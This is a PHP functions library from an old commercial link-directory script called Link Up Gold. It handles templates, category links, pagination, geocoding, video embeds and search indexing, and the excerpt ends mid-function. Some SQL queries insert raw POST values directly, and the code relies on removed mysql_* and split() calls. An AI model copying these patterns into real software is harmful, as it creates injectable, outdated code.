<?PHP

#################################################
##                                             ##
##               Link Up Gold                  ##
##       http://www.phpwebscripts.com/         ##
##       e-mail: info@phpwebscripts.com        ##
##                                             ##
##                                             ##
##               version:  8.0                 ##
##            copyright (c) 2012               ##
##                                             ##
##  This script is not freeware nor shareware  ##
##    Please do no distribute it by any way    ##
##                                             ##
#################################################

error_reporting (E_ERROR | E_PARSE);
include_once("$s[phppath]/administration/f.php");
if (ini_get("magic_quotes_sybase")) ini_set("magic_quotes_sybase",0);
if (ini_get("magic_quotes_gpc")) ini_set("magic_quotes_gpc",0);
if (ini_get("magic_quotes_runtime")) ini_set("magic_quotes_runtime",0);
$s[rewrite_when_repair] = 0;

$s[cas] = time() + $s[timeplus];
$linkid = db_connect(); if (!$linkid) die($s[db_error]);
include("$s[phppath]/data/stats.php");
$s[ip] = getenv('REMOTE_ADDR');
if (!preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])" . "(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/",$s[ip])) $s[ip] = 'UNKNOWN';

list($s[year],$s[month],$s[day]) = explode('-',date("Y-n-j",$s[cas]));
$s[email_from] = $s[mail];
$s[item_types_short] = array('l','a','v','n','b');
$s[item_types_words] = array('l'=>'link','a'=>'article','v'=>'video','n'=>'new','b'=>'blog');
$s[item_types_Words] = array('l'=>'Link','a'=>'Article','v'=>'Video','n'=>'News Item','b'=>'Blog');
$s[items_types_words] = array('l'=>'links','a'=>'articles','v'=>'videos','n'=>'news','b'=>'blogs','u'=>'users','c'=>'categories');
$s[items_types_Words] = array('l'=>'Links','a'=>'Articles','v'=>'Videos','n'=>'News','b'=>'Blogs');
$s[item_types_tables] = array('l'=>"$s[pr]links",'a'=>"$s[pr]articles",'v'=>"$s[pr]videos",'n'=>"$s[pr]news",'b'=>"$s[pr]blogs",);
$s[item_types_scripts] = array('l'=>'links.php','a'=>'articles.php','v'=>'videos.php','n'=>'news.php','b'=>'blogs.php');

if ($s[A_option]=='rewrite') include("$s[phppath]/f_rewrite.php");
elseif ($s[A_option]=='static') include_once("$s[phppath]/administration/html_build_functions.php");

$user_agent = getenv('HTTP_USER_AGENT');
if (!preg_match('/Googlebot|slurp\\@inktomi\\.com;/',$HTTP_USER_AGENT)) session_start();
$s[youtube_thumbnail] = "http://i.ytimg.com/vi/#%id%#/default.jpg";

if (!function_exists("htmlspecialchars_decode")) {
function htmlspecialchars_decode($string,$style=ENT_COMPAT)
{ $translation = array_flip(get_html_translation_table(HTML_SPECIALCHARS,$style));
  if($style === ENT_QUOTES){ $translation['&#039;'] = '\''; }
  return strtr($string,$translation);
}
}

if(!function_exists('str_split')) {
    function str_split($string,$string_length=1) {
        if(strlen($string)>$string_length || !$string_length) {
            do {
                $c = strlen($string);
                $parts[] = substr($string,0,$string_length);
                $string = substr($string,$string_length);
            } while($string !== false);
        } else {
            $parts = array($string);
        }
        return $parts;
    }
}

##################################################################################

function parse_part($t,$vl,$email) {
global $s,$m;
if (!is_array($vl)) $vl = array();
$vl = array_merge($vl,get_common_variables());
//$style = find_style();
$t = template_select($t,$email,$s[LUG_style]);
$line = parse_variables_in_template($t,$vl);
return $line = preg_replace("/#%[a-z0-9_]*%#/i",'',$line);
}

#####################################################################################

function get_common_variables() {
global $s,$m;
$vl[adminemail] = $s[mail]; $vl[currency] = $s[currency];
if ($s[LUG_u_n]) { $vl[hide_for_user_begin] = '<!--'; $vl[hide_for_user_end] = '-->'; $vl[LUG_u_username] = $s[LUG_u_username]; }
else { $vl[hide_for_no_user_begin] = '<!--'; $vl[hide_for_no_user_end] = '-->'; }
$vl[year] = $s[year];
$vl[site_url] = $s[site_url]; $vl[site_name] = $s[site_name]; $vl[charset] = $s[charset];
$vl[captcha_code] = $s[cas];
$vl[google_search_id] = $s[google_search_id];
if (trim($s[banner_code])) $vl[banner_code] = '<div align="center" style="padding-bottom:15px;">'.$s[banner_code].'</div>';
if ($s[LUG_u_n]) { $vl[hide_for_user_begin] = '<!--'; $vl[hide_for_user_end] = '-->'; $vl[LUG_u_username] = $s[LUG_u_username]; }
else { $vl[hide_for_no_user_begin] = '<!--'; $vl[hide_for_no_user_end] = '-->'; }
if ((!$s[LUG_style]) OR (!is_dir("$s[phppath]/styles/$s[LUG_style]"))) $s[LUG_style] = $s[def_style];
$vl[logo_url] = $s[logo_url]; $vl[css_style] = $s[LUG_style];
if ($s[A_option]=='static') $vl[hide_div_static] = ' style="display:none"';
return $vl;
}

#####################################################################################
#####################################################################################
#####################################################################################

function load_times() {
global $s;
$q = dq("select * from $s[pr]times",1);
while ($x=mysql_fetch_assoc($q)) $s[$x[what]] = $x['time'];
if (!$s[times_d]) $s[times_d] = 1;
if (!$s[times_m]) $s[times_m] = 1;
}

function save_times() {
global $s;
dq("truncate table $s[pr]times",1);
dq("insert into $s[pr]times values ('times_d','$s[times_d]')",1);
dq("insert into $s[pr]times values ('times_m','$s[times_m]')",1);
}

#####################################################################################

function get_all_countries() {
global $s;
$q = dq("select flag,name,code from $s[pr]countries",1);
while ($x=mysql_fetch_assoc($q)) $s[countries][$x[code]] = $x;
}

#####################################################################################

function show_qrcode($data) {
global $s;
if (!$data) $data = "$s[site_url]/";
//error_reporting(E_ALL);
include "$s[phppath]/qrcode/qrlib.php";    
$errorCorrectionLevel = 'M';
$matrixPointSize = 4;
$filename = 'images/qrcodes/'.md5($data.'|'.$errorCorrectionLevel.'|'.$matrixPointSize).'.png';
//if (file_exists("$s[phppath]/$filename")) return "$s[site_url]/$filename";
QRcode::png($data,"$s[phppath]/$filename",$errorCorrectionLevel,$matrixPointSize, 2);
return "$s[site_url]/$filename";
}

#####################################################################################
#####################################################################################
#####################################################################################

function get_geo_data($address,$what,$n) {
global $s;
//return false;
$n = round($n); if ((!$n) OR ($n<=0)) return false;
if (!$address)
{ $item_vars = get_item_variables($what,$n);
  if (!strstr($item_vars[map],'_gmok_')) unset($address);
  $address = str_replace('_gmok_','',$item_vars[map]);
}

if (trim($address))
{ //$address = "http://maps.google.com/maps/geo?q=".urlencode($address)."&output=xml";
  $address = "http://maps.googleapis.com/maps/api/geocode/xml?sensor=false&address=".urlencode($address);
  //$address = "http://maps.googleapis.com/maps/api/geocode/json?address=".urlencode($address)."&sensor=false";
  $page = fetchURL($address);
}
 
if (trim($page))
{ preg_match("/(<location>)(.*)(<\/location>)/isU",$page,$x); 
  preg_match("/(<lat>)(.*)(<\/lat>)/isU",$x[2],$x1); $b[latitude] = $x1[2];
  preg_match("/(<lng>)(.*)(<\/lng>)/isU",$x[2],$x1); $b[longitude] = $x1[2];
  preg_match_all("/(<address_component>)(.*)(<\/address_component>)/isU",$page,$x);
  foreach ($x[2] as $k => $component)
  { preg_match("/(<type>)(.*)(<\/type>)/isU",$component,$x1); $component_name = $x1[2];
    preg_match("/(<long_name>)(.*)(<\/long_name>)/isU",$component,$x1); $long_name = $x1[2];
    preg_match("/(<short_name>)(.*)(<\/short_name>)/isU",$component,$x1); $short_name = $x1[2];
    $b[$component_name][long_name] = $long_name;
    $b[$component_name][short_name] = $short_name;
  }
  //foreach ($a as $k => $v) echo "$k --- $v[short_name] --- $v[long_name]<br><br>";
  //exit;
  $a[country] = $b[country][short_name];
  $a[zip] = $b[postal_code][long_name];
  $a[country_name] = $b[country][long_name];
  $a[region] = $b[administrative_area_level_1][long_name];
  if (trim($b[administrative_area_level_2][long_name])) $city[] = $b[administrative_area_level_2][long_name]; 
  if (trim($b[locality][long_name])) $city[] = $b[locality][long_name]; 
  if (trim($b[sublocality][long_name])) $city[] = $b[sublocality][long_name];
  $a[city] = implode(', ',array_unique($city));
  $a[latitude] = $b[latitude];
  $a[longitude] = $b[longitude];
  //foreach ($a as $k=>$v) echo "$k - $v<br>";
  if ($what=='c')
  { if (($_POST[latitude]) AND ($_POST[latitude]!=0.0000000)) $a[latitude] = $_POST[latitude];
    if (($_POST[longitude]) AND ($_POST[longitude]!=0.0000000)) $a[longitude] = $_POST[longitude];
    $a = replace_array_text($a);
    dq("update $s[pr]cats set latitude = '$a[latitude]', longitude = '$a[longitude]', country = '$a[country]', region = '$a[region]', city = '$a[city]', zip = '$a[zip]' where n = '$n'",1);
  }
  else
  { $q = dq("select * from $s[pr]items_maps where n = '$n' and what = '$what'",1);
    $b = mysql_fetch_assoc($q);
    if (!$b[n]) dq("insert into $s[pr]items_maps (what,n) values ('$what','$n')",1);
    $a = replace_array_text($a);
    if (($a[latitude]) AND ($a[longitude])) dq("update $s[pr]items_maps set latitude = '$a[latitude]', longitude = '$a[longitude]', country = '$a[country]', region = '$a[region]', city = '$a[city]', zip = '$a[zip]' where n = '$n' and what = '$what'",1);
    else dq("update $s[pr]items_maps set latitude = '-1', longitude = '-1', country = '$a[country]', region = '$a[region]', city = '$a[city]', zip = '$a[zip]' where n = '$n' and what = '$what'",1);
  }
}
else
{ if ($what=='c') dq("update $s[pr]cats set latitude = '$_POST[latitude]', longitude = '$_POST[longitude]', country = '', region = '', city = '', zip = '' where n = '$area'",1);
  else dq("update $s[pr]items_maps set latitude = '-1', longitude = '-1', country = '', region = '', city = '', zip = '' where n = '$n' and what = '$what'",1);
}
$s[ll_data] = $a;
return $a;
}

#####################################################################################

function get_items_maps_variables($what,$n) {
global $s;
$q = dq("select * from $s[pr]items_maps where what = '$what' and n = '$n'",1);
$a = mysql_fetch_assoc($q);
if ($a[n]) return $a;
return get_geo_data($address,$what,$n);
}

#####################################################################################

function get_youtube_url($youtube_id) {
global $s;
if (!trim($youtube_id)) return false;
return "http://www.youtube.com/watch?v=$youtube_id";
}

#####################################################################################

function get_youtube_id($youtube_url) {
global $s;
if (!strstr($youtube_url,'youtube.')) return false;
if (!strstr($youtube_url,'http://')) $youtube_url = "http://$youtube_url";
preg_match("/v=[a-zA-Z0-9\-_]+/",$youtube_url,$matches);
if (!$matches[0]) preg_match("/v\/[a-zA-Z0-9\-_]+/",$youtube_url,$matches);
if (!$matches[0]) return false;
$a = $matches[0];
$a = str_replace('v=','',$a);
$a = str_replace('v/','',$a);
return $a;
}

#####################################################################################

function youtube_player($youtube_id,$video_code) {
global $s;
if ($video_code) return $video_code;
if (!trim($youtube_id)) return false;
return '<object width="560" height="315"><param name="movie" value="http://www.youtube.com/v/'.$youtube_id.'?version=3&amp;hl=en_US&amp;rel=0"></param><param name="allowFullScreen" value="true"></param><param name="allowscriptaccess" value="always"></param><embed src="http://www.youtube.com/v/'.$youtube_id.'?version=3&amp;hl=en_US&amp;rel=0" type="application/x-shockwave-flash" width="560" height="315" allowscriptaccess="always" allowfullscreen="true"></embed></object>';
}

#####################################################################################
#####################################################################################
#####################################################################################

function category_url($what,$n,$alias_of,$name,$page,$pagename,$rewrite_url,$sort,$direction) {
global $s;
$x = explode(' ',str_replace('_','',$n)); $n = $x[0]; // pro pripad ze n je pole
if ($alias_of)
{ $n = str_replace('_','',$alias_of);
  $alias = get_category_variables($n);
  $what = $alias[use_for]; $name = $alias[name]; $pagename = $alias[pagename]; $rewrite_url = $alias[rewrite_url]; $sort = '';
}
$sort = str_replace('pick desc,','',$sort); $sort = str_replace(' desc','',$sort);
if ($s[A_option]=='static') return A_category_url($what,$n,$name,$pagename,$page);
elseif ($s[A_option]=='rewrite') return rewrite_category_url($what,$n,$page,$rewrite_url,$sort,$direction);
else
{ $script = $s[item_types_scripts][$what];
  if ((is_numeric($page)) AND ($page>1)) $page = "&amp;page=$page"; else $page = '';
  if ($sort) { $sort = "&amp;sort=$sort"; if ($direction) $direction = "&amp;direction=$direction"; else $direction = ''; }  else $sort = $direction = '';
  return "$s[site_url]/$script?n=$n$page$sort$direction";
}
}

##################################################################################

function prepare_keywords($in) {
global $s;
$keywords = explode("\n",str_replace(',',"\n",$in));
foreach ($keywords as $k=>$v) { $keywords[$k] = trim($keywords[$k]); if (!$keywords[$k]) unset($keywords[$k]); }
return implode("\n",$keywords);
}

###################################################################################
###################################################################################

function has_some_enabled_categories($what,$c) {
global $s;
// v $c ceka seznam kategorii _1_ _2_
if (!$s[all_disabled_categories][$what]) $s[all_disabled_categories][$what] = get_disabled_cats_in_array($what);
if (is_array($c)) $x = $c; else $x = explode(' ',str_replace('_','',$c));
foreach ($x as $k=>$v) { if(in_array($v,$s[all_disabled_categories][$what])) $bad++; }
if (count($x)>$bad) return 1;
return 0;
}

###################################################################################

function list_of_categories_for_item($what,$n,$c,$line_separator,$incl_disabled) {
global $s;
if (is_array($c)) $x = $c; else $x = explode(' ',str_replace('_','',$c));
$categories = get_category_data($what,$x,$incl_disabled);
foreach ($categories as $k=>$v)
{ if (!$v) continue;
  $url = category_url($what,$k,0,$v[name],1,'','','','');
  $c_name[] = $v[name];
  $c_links[] = '<a href="'.$url.'">'.$v[name].'</a>';
  $c_links_incl[] = '<a href="'.$url.'">'.stripslashes(str_replace('_',' ',str_replace('<%','',str_replace('%>',' - ',$v[path_text])))).'</a>';
  $c_urls[] = $url;
  if ($k==$_GET[c]) { $a[category_name] = $v[name]; $a[category] = $k; } // item details page
}
$a[categories_names] = implode($line_separator,$c_name); $a[categories] = implode($line_separator,$c_links); $a[categories_incl] = implode($line_separator,$c_links_incl); $a[categories_urls] = implode($line_separator,$c_urls); 
return $a;
}

##################################################################################

function tags_for_item($what,$c,$keywords) {
global $s;
if (is_array($c)) $x = $c; else $x = explode(' ',str_replace('_','',$c));
$categories = get_category_data($what,$x,0);
foreach ($categories as $k=>$v) { $name = trim($v[name]); if (!$name) continue; $tags_array[] = $name; }
$keywords_array = explode("\n",str_replace(',',"\n",$keywords));
foreach ($keywords_array as $k=>$v) { $v = trim($v); if (!$v) continue; $tags_array[] = $v; }
foreach ($tags_array as $k=>$v) $tags_a[] = '<img border="0" src="'.$s[site_url].'/images/icon_tag.gif">&nbsp;<a href="'.$s[site_url].'/search.php?phrase='.urlencode($v).'">'.str_replace(' ','&nbsp;',$v).'</a>';
return '&nbsp;'.implode(' &nbsp; ',$tags_a);
}

###################################################################################

function get_category_data($what,$n,$incl_disabled) {
global $s;
if (is_array($n)) foreach ($n as $k=>$v) if (!$v) unset($n[$k]);
if ((is_array($n)) AND ($n[0])) $query = my_implode('n','or',$n);
elseif ($n) $query = "n = '$n'";
else return false;
if (!$incl_disabled) $query .= ' AND visible = 1 ';
$q = dq("select n,name,description,path_text,path_n,visible from $s[pr]cats where use_for = '$what' AND $query order by name",1);
while ($x=mysql_fetch_assoc($q)) $categories[$x[n]] = $x;
return $categories;
}

###################################################################################

function all_categories_select($field_name,$selected) {
global $s,$m;
foreach ($s[items_types_words] as $k=>$v) if (!$m[$v]) $m[$v] = $s[items_types_Words][$k];
return '<select class="select10" name="'.$field_name.'"><option value=0>None</option>
<optgroup label="'.$m[links].'">'.categories_selected('l',$selected,1,1,1,1).'</optgroup>
<optgroup label="'.$m[blogs].'">'.categories_selected('b',$selected,1,1,1,1).'</optgroup>
<optgroup label="'.$m[videos].'">'.categories_selected('v',$selected,1,1,1,1).'</optgroup>
<optgroup label="'.$m[news].'">'.categories_selected('n',$selected,1,1,1,1).'</optgroup>
<optgroup label="'.$m[articles].'">'.categories_selected('a',$selected,1,1,1,1).'</optgroup>
</select>';
}

###################################################################################

function get_disabled_cats_in_array($use_for) {
global $s;
$q = dq("select n from $s[pr]cats_disabled where use_for = '$use_for'",1);
while ($x = mysql_fetch_row($q)) $a[] = $x[0];
return $a;
}

##################################################################################

function get_more_categories($action,$what,$category,$sort,$direction) {
global $s,$m;
//if ($s[A_option]=='static') $parse_part = 'A_parse_part'; else $parse_part = 'parse_part'; 
$columns = $s[subc_column];

if ($action=='subcategories')
{ $q = dq("select * from $s[pr]cats where use_for = '$what' AND visible = '1' AND parent = '$category' order by name",1);
  $a[title] = $m[subcats];
}
elseif ($action=='similar') 
{ $numbers = explode(' ',str_replace('_','',$category[similar]));
  if ($numbers)
  { $x = my_implode('n','OR',$numbers);
    $q = dq("select * from $s[pr]cats where visible = '1' AND $x order by path_text",0);
  }
  $a[title] = $m[similar_cats];
}
if (!mysql_num_rows($q)) return false;

while ($c = mysql_fetch_assoc($q))
{ $c[url] = category_url($c[use_for],$c[n],$c[alias_of],$c[name],1,$c[pagename],$c[rewrite_url],$sort,$direction);
  $c[folder_icon] = folder_icon($c[item_created],$c[image2]);
  if ($c[alias_of]) $c[name] = $s[alias_pref].$c[name].$s[alias_after];
  $s[items_types_words][$c[use_for]];
  $c[items] = "$c[items] ".$m[$s[items_types_words][$c[use_for]].'1'];
  $c[width] = floor(100/$columns);
  /*if ($action=='subcategories')
  { echo kk;$q1 = dq("select * from $s[pr]cats where parent = '$c[n]' and visible = '1'",1);
    while ($x=mysql_fetch_assoc($q1)) $subcats_array[] = '<a class="link10" href="'.category_url($x[use_for],$x[n],$x[alias_of],$x[name],1,$x[pagename],$x[rewrite_url],$sort,$direction).'">'.$x[name].'</a>';
    $c[subcategories] = implode(', ',$subcats_array); unset($subcats_array);
    echo $c[subcategories];
  }*/
  $subcategories[] = parse_part('categories_category.txt',$c);
  $pocet++;
}
if (!$pocet) return false;
$rows = ceil($pocet/$columns);
for ($x=$pocet+1;$x<=($rows*$columns);$x++)
{ $subcategories[] .= '<td>&nbsp;</td>';
  $pocet++;
}
if ($s[in_sort_rows]==1)
{ for ($x=1;$x<=$rows;$x++)
  { $a[categories] .= '<tr>';
    for ($y=($x-1)*$columns;$y<=$x*$columns-1;$y++)
    $a[categories] .= $subcategories[$y];
    $a[categories] .= '</tr>';
  }
}
else
{ for ($x=1;$x<=$rows;$x++)
  { $a[categories] .= '<tr>';
    for ($y=$x-1;$y<=$pocet-1;$y=$y+$rows)
    $a[categories] .= $subcategories[$y];
    $a[categories] .= '</tr>';
  }
}
return $a[categories];
}
{ $s[cs] = 4;
}

###################################################################################

function category_get_arrow($what,$level,$parent) {
global $s,$m;
if ($level>1)
{ $c[parent] = $parent;
  for ($x=$level;$x>1;$x--)
  { $q = dq("select * from $s[pr]cats where use_for = '$what' AND visible = '1' AND n = '$c[parent]'",1);
    $c = mysql_fetch_assoc($q);
    $rozcestnik = '<a href="'.category_url($what,$c[n],$c[alias_of],$c[name],1,$c[pagename],$c[rewrite_url],'','').'">'.$c[name].'</a> >> '.$rozcestnik;
  }
}
return $rozcestnik;
}

###################################################################################

function category_pages_list_numbers($what,$category,$name,$pagename,$total,$page,$rewrite_url,$sort,$direction) {
global $s,$m;
$perpage = $s[$what.'_per_page'];
$pages = ceil($total/$perpage); 
if ($pages==1) return false;
else
{ for ($x=1;$x<=$pages;$x++)
  { if ($s[category_use_ajax])
    { if ($x==$page) $pages_numbers .= "&nbsp;$x "; 
      elseif ((!$s[pages_max_links]) OR (($x>=($page-$s[pages_max_links])) AND ($x<=($page+$s[pages_max_links])))) $pages_numbers .= "<a href=\"#content_top\" onclick=\"show_waiting('content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category&what=$what&n=$category&sort=$sort&direction=$direction&page=$x','content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list&what=$what&n=$category&sort=$sort&direction=$direction&page=$x&total=$total&rewrite=$rewrite_url','pages_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list1&what=$what&n=$category&sort=$sort&direction=$direction&page=$x&total=$total&rewrite=$rewrite_url','pages_div_box1');\">".$x."</a> ";
      if ($s[pages_max_links])
      { if ($page>1) $link_first = "<a href=\"#content_top\" onclick=\"show_waiting('content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category&what=$what&n=$category&sort=$sort&direction=$direction&page=1','content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list&what=$what&n=$category&sort=$sort&direction=$direction&page=1&total=$total&rewrite=$rewrite_url','pages_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list1&what=$what&n=$category&sort=$sort&direction=$direction&page=1&total=$total&rewrite=$rewrite_url','pages_div_box1');\">&laquo;&laquo;&laquo;</a> ";
        if ($page<$pages) $link_last = "<a href=\"#content_top\" onclick=\"show_waiting('content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category&what=$what&n=$category&sort=$sort&direction=$direction&page=$x','content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list&what=$what&n=$category&sort=$sort&direction=$direction&page=$x&total=$total&rewrite=$rewrite_url','pages_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list1&what=$what&n=$category&sort=$sort&direction=$direction&page=$x&total=$total&rewrite=$rewrite_url','pages_div_box1');\">&raquo;&raquo;&raquo;</a> ";
      }
      if ($x==($page-1))
      { $link_down = "<a href=\"#content_top\" onclick=\"show_waiting('content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page-1)."','content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page-1)."&total=$total&rewrite=$rewrite_url','pages_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list1&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page-1)."&total=$total&rewrite=$rewrite_url','pages_div_box1');\">&laquo;</a> ";
        $url = category_url($what,$category,0,$name,$page-1,$rewrite_url,$pagename,$sort,$direction);
        $s[head_pagination] .= "<link rel=\"prev\" href=\"$url\">\n";
      }
      elseif ($x==($page+1))
      { $link_up = "<a href=\"#content_top\" onclick=\"show_waiting('content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page+1)."','content_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page+1)."&total=$total&rewrite=$rewrite_url','pages_div_box');javascript:parse_ajax_request('','$s[site_url]/ajax.php?action=category_pages_list1&what=$what&n=$category&sort=$sort&direction=$direction&page=".($page+1)."&total=$total&rewrite=$rewrite_url','pages_div_box1');\">&raquo;</a> ";
        $url = category_url($what,$category,0,$name,$page+1,$rewrite_url,$pagename,$sort,$direction);
        $s[head_pagination] .= "<link rel=\"next\" href=\"$url\">\n";
      }
    }
    else
    { if ($x==$page) $pages_numbers .= "&nbsp;$x "; 
      elseif ((!$s[pages_max_links]) OR (($x>=($page-$s[pages_max_links])) AND ($x<=($page+$s[pages_max_links])))) $pages_numbers .= '<a href="'.category_url($what,$category,0,$name,$x,$pagename,$rewrite_url,$sort,$direction).'">'.$x.'</a> ';
      if ($s[pages_max_links])
      { if ($page>1) $link_first = '<a href="'.category_url($what,$category,0,$name,1,$pagename,$rewrite_url,$sort,$direction).'">&laquo;&laquo;&laquo;</a> ';
        if ($page<$pages) $link_last = '<a href="'.category_url($what,$category,0,$name,$x,$pagename,$rewrite_url,$sort,$direction).'">&raquo;&raquo;&raquo;</a> ';
      }
      if ($x==($page-1))
      { $url = category_url($what,$category,0,$name,$page-1,$rewrite_url,$pagename,$sort,$direction);
        $link_down = '<a href="'.$url.'">&laquo;</a> ';
        $s[head_pagination] .= "<link rel=\"prev\" href=\"".str_replace('&amp;','&',$url)."\">\n";
      }
      elseif ($x==($page+1))
      { $url = category_url($what,$category,0,$name,$page+1,$rewrite_url,$pagename,$sort,$direction);
        $link_up = '<a href="'.$url.'">&raquo;</a> ';
        $s[head_pagination] .= "<link rel=\"next\" href=\"".str_replace('&amp;','&',$url)."\">\n";
      }
    }
  }
  $pages_list = " $link_first$link_down$pages_numbers$link_up$link_last ";
}
$s[pages_list_numbers] = $pages_list;
return $pages_list;
}

###################################################################################

function get_icons_for_item($what,$in,$bookmark,$separator) {
global $s;
if (!$separator) $separator = '&nbsp;';
$marknew = $s[$what.'_marknew'];
if ((($in[updated]+$marknew) > $s[cas]) AND ($s[pref_upd]) AND ($s[upd_img])) $icon = $s[upd_img];
elseif ((($in[created]+$marknew) > $s[cas]) AND ($s[new_img])) $icon = $s[new_img];
elseif ((($in[updated]+$marknew) > $s[cas]) AND ($s[upd_img])) $icon = $s[upd_img];
elseif (($in[popular]) AND ($s[pop_img])) $icon = $s[pop_img];
elseif (($in[pick]) AND ($s[pick_img])) $icon = $s[pick_img];
elseif ($bookmark) $icon = $s[bookmark_img];
if ($icon) return 'style="padding-left:50px;BACKGROUND-IMAGE:url(\''.$icon.'\'); BACKGROUND-REPEAT:no-repeat;"';
}

###################################################################################

function get_rateicon($in_rating) {
global $s;
if ($in_rating==0.00) return false;
$rating = round(($in_rating*2));
return "<img src=\"$s[site_url]/images/$rating.png\" border=\"0\">";
}

###################################################################################

function pictures_files_display_public($what,$numbers,$queue) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if (is_array($numbers)) $query = my_implode('item_n','or',$numbers);
else $query = "item_n = '$numbers'";
$q = dq("select * from $s[pr]files where $query and queue = '$queue' and what = '$what' order by file_n",1);
while ($x = mysql_fetch_assoc($q))
{ if ($x[file_type]=='image')
  { $images[$x[item_n]][$x[file_n]][url] = $x[filename];
    $images[$x[item_n]][$x[file_n]][description] = $x[description];
    $images[$x[item_n]][$x[file_n]][n] = $x[n];
    $big_file = preg_replace("/\/$x[item_n]-/","/$x[item_n]-big-",$x[filename]);
    if (file_exists(str_replace("$s[site_url]/","$s[phppath]/",$x[filename]))) $images[$x[item_n]][$x[file_n]][big_url] = $big_file;
    else $images[$x[item_n]][$x[file_n]][big_url] = $x[filename];
  }
}
return array($images,$files);
}

##################################################################################

function detail_page_images($what,$images,$n,$html,$item_vars) {
global $s;
if ($item_vars[picture])
{ $table = $s[item_types_tables][$what];
  $test_path = str_replace($s[site_url],$s[phppath],$item_vars[picture]);
  if (file_exists($test_path)) $picture1 = 1;
  elseif ($table) dq("update $table set picture = '' where n = '$n' and status != 'queue'",1);
}
if ($html) $function = 'A_parse_part'; else $function = 'parse_part';
foreach ($images as $k=>$v)
{ $pictures++;
  $big_url = preg_replace("/\/$n-/","/$n-big-",$v[url]);

  $path_small = str_replace($s[site_url],$s[phppath],$v[url]); $exists_small = file_exists($path_small);
  $path_big = str_replace($s[site_url],$s[phppath],$big_url); $exists_big = file_exists($path_big);
  if ((!$exists_small) OR (!$exists_big))
  { if ($exists_small) $big_url = copy($path_small,$path_big);
    elseif ($exists_big)
    { $w_small = $s[$what.'_image_small_w']; if (!$w_small) $w_small = '120';
      $h_small = $s[$what.'_image_small_h']; if (!$h_small) $h_small = '120';
      resize_image($path_big,$path_small,$w_small,$h_small);
    }
    else // nothing exists, delete record?
    { //dq("delete from $s[pr]files where what = '$what' and file_type = 'image' and item_n = '$n' and filename = '$v[url]'",1);
      continue;
    }
  }
  if (!$picture1)
  { $table = $s[item_types_tables][$what];
    if ($table) dq("update $table set picture = '$v[url]' where n = '$n' and status != 'queue'",1);
    //echo "update $table set picture = '$v[url]' where n = '$n' and status != 'queue'";
    $picture1 = 1;
  }
  
  $full_size_image = '<br><img border="0" src="'.$big_url.'" alt="'.$v[description].'"><br>'.$v[description];
  $a[all_images] .= '<a href="javascript:show_gallery(\'image-'.$pictures.'\');"><img border="0" src="'.$v[url].'"></a> ';

  $v[url] = $big_url;
  $a[pictures] .= '<div id="image-'.$pictures.'" style="display:none;text-align:center;padding:5px;"><img border="0" src="'.$v[url].'"><br>'.$v[description].'</div>';
  //$a[all_images] .= $function('gallery_image.txt',$v);
  //$pictures++;
}
if (!$pictures) return false;
if ($pictures==1) return array('full_size_image'=>'<div align="center" style="padding:10px;">'.$full_size_image.'</div>');
$a[previews_width] = $pictures*85; if ($a[previews_width]>705) $a[previews_width] = 705;
return array('pictures_gallery'=>$function('gallery.txt',$a));
}

###################################################################################

function index_site_news($html) {
global $s;
if ($html) $function = 'A_parse_part'; else $function = 'parse_part';
$q = dq("select * from $s[pr]site_news order by time desc limit $s[news_home]",1);
while ($x = mysql_fetch_assoc($q))
{ foreach ($s[items_types_words] as $what=>$what_long)
  { unset($x["related_$what_long"]);
    $table = $s[item_types_tables][$what];
    $x['date'] = datum($x[time],0);
    if ($x["related_$what"])
    { $query = my_implode('n','or',explode(' ',$x["related_$what"]));
      if ($query)
      { $q1 = dq("select * from $table where $query",1);
        while ($x1 = mysql_fetch_assoc($q1))
        $x["related_$what_long"] .= '<a href="'.get_detail_page_url($what,$x1[n],$x1[rewrite_url],$x1[category],1).'">'.$x1[title].'</a><br />';
      }
    }
    if (!$x["related_$what_long"]) { $x['hide_related_'.$what.'_begin'] = '<!--'; $x['hide_related_'.$what.'_end'] = '-->'; }
  }
  $a .= $function('site_news.txt',$x);
}
return $a;
}

###################################################################################

function update_item_index($what,$n) {
global $s;
dq("delete from $s[pr]index where n = '$n' and what = '$what'",1);
$q = dq("select all_usit from $s[pr]usit_search where n = '$n' and use_for = '$what' limit 1",1);
$usit = mysql_fetch_assoc($q);
$item = get_item_variables($what,$n,0);

//foreach ($item as $k=>$v) echo "$k - $v<br>";exit;

update_cats_items($what,$n,$item);
if (!$s[no_twitter]) twitter_it($what,$item);

if (!$item[n]) return false;
$b[] = $item[title];
$b[] = $item[description];
if (($what=='a') OR ($what=='b') OR ($what=='n')) $b[] = $item[text];
elseif ($what=='l') $b[] = $item[detail];
$b[] = $item[keywords];
if ($what=='l') $b[] = $item[url];
$b[] = $usit[all_usit];
foreach ($b as $k=>$v) if (trim($v)) $b[$k] = str_replace("'","\'",str_replace(chr(92),'',$v)); else $b[$k] = '-';
$all_text = strip_tags(implode("\n_____\n",$b));
dq("insert into $s[pr]index values ('$what','$n','$all_text')",'1');
dq("delete from $s[pr]index_suggest where n = '$n' and what = '$what'",1);
$words = split("[ ]+",str_replace("'","\'",str_replace(chr(92),'',$item[title])));
